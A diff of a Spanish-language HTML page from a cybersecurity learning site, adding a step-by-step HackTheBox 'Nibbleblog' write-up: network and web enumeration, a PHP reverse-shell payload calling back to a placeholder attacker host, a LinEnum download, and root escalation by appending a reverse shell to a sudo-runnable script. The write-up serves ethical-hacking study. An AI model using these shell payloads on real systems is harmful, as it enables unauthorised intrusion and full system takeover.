@@ -1,40 +1,68 @@
 <!DOCTYPE html>
 <html lang="es">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Espacio de aprendizaje en Ciberseguridad">
-    <title>Metahumo | Ciberseguridad</title>
-    <link rel="stylesheet" href="style.css">
+    <meta name="description" content="Ejercicios de pentesting y ciberseguridad">
+    <title>Ejercicios | Metahumo</title>
+    <link rel="stylesheet" href="ejercicios.css">
+    <script defer src="ejercicios.js"></script>
 </head>
-
 <body>
 
     <header>
-        <h1>Bienvenido a Metahumo</h1>
-        <p>Un espacio dedicado al aprendizaje de la ciberseguridad para la comunidad hispanohablante.</p>
+        <h1>Ejercicios de Ciberseguridad</h1>
+        <p>Prácticas y retos de pentesting documentados paso a paso.</p>
     </header>
 
     <nav>
         <ul>
-            <li><a href="./ejercicios/">Ejercicios Resueltos</a></li>
-            <li><a href="./herramientas/">Herramientas</a></li>
-            <li><a href="./traducciones/">Traducciones</a></li>
+            <li><a href="../index.html">Inicio</a></li>
+            <li><a href="../herramientas/">Herramientas</a></li>
+            <li><a href="../traducciones/">Traducciones</a></li>
         </ul>
     </nav>
 
-    <section class="intro">
-        <h2>Aprende y Comparte</h2>
-        <p>En Metahumo encontrarás materiales educativos sobre Pentesting, Red Teaming, Hacking Ético y más, todo disponible en español.</p>
-    </section>
+    <main>
+        <section id="lista-ejercicios">
+            <h2>Listado de Ejercicios</h2>
+            <ul>
+                <li><a href="#htb-nibbleblog">HTB - Explotación de Nibbleblog</a></li>
+            </ul>
+        </section>
+
+        <section id="htb-nibbleblog" class="ejercicio">
+            <h2>HTB - Explotación de Nibbleblog</h2>
+            <button class="toggle-btn">Mostrar/Ocultar detalles</button>
+            <div class="contenido">
+                <h3>Exención de responsabilidad</h3>
+                <p>Este contenido tiene fines educativos y debe utilizarse en entornos controlados.</p>
+                <h3>Fase I: Enumeración y Acceso</h3>
+                <pre><code>nmap -sV --open -oA Upload_php_initial_scan -n -Pn -sS -v 10.129.168.126</code></pre>
+                <h4>Verificación de la web con cURL</h4>
+                <pre><code>curl http://10.129.168.126:80</code></pre>
+                <h4>Identificación de tecnologías con WhatWeb</h4>
+                <pre><code>whatweb http://10.129.168.126:80/nibbleblog</code></pre>
+                <h4>Enumeración de directorios con Gobuster</h4>
+                <pre><code>gobuster dir -u http://10.129.168.126:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30</code></pre>
+                <h4>Obtención de una Shell Reversa</h4>
+                <pre><code>
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1234 >/tmp/f"); ?>
+                </code></pre>
+                <h3>Fase II: Escalada de Privilegios</h3>
+                <h4>Uso de LinEnum</h4>
+                <pre><code>wget http://10.10.10.X:1234/LinEnum.sh</code></pre>
+                <h4>Abuso de permisos en scripts</h4>
+                <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1235 >/tmp/f' | tee -a monitor.sh</code></pre>
+                <h4>Obtención de acceso root</h4>
+                <pre><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></pre>
+            </div>
+        </section>
+    </main>
 
     <footer>
-        <p>&copy; 2025 Metahumo | Licencia Creative Commons Zero v1.0 Universal (CC0)</p>
+        <p>&copy; 2025 Metahumo - Licencia CC0</p>
     </footer>
 
-    <script src="script.js"></script>
-
 </body>
-
 </html>
